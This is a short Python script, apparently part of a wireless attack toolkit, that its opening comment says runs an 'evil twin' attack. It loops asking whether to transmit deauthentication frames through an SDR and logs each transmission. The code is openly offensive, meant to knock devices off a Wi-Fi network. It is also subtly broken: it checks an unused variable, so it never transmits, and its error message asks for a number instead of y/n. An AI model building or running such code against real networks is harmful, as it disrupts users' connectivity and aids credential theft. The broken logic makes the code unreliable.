# code to run the evil twin attack
import frames
from attackLogGenerator import EventHandler
from SDRtransmitTCP import transmitData

def transmit_frame_deauth(log:EventHandler):
    while(True):
        choice = None
        while(True):
            mode_choice = input("transmit deauth frame? (y/n): ")
            if mode_choice in ["y", "n"]:
                break
            else:
                print("Invalid choice. Please enter a valid number.")
        if choice=="y":
            raw_frame = frames.start_deauthentication_frame_generator()
            event_type = "deauthentication_frame_transmission"
            details = "Transmitted a deauthentication frame"    
            transmitData(raw_frame)
            log.log_event(event_type,details)
        
        else:
            break



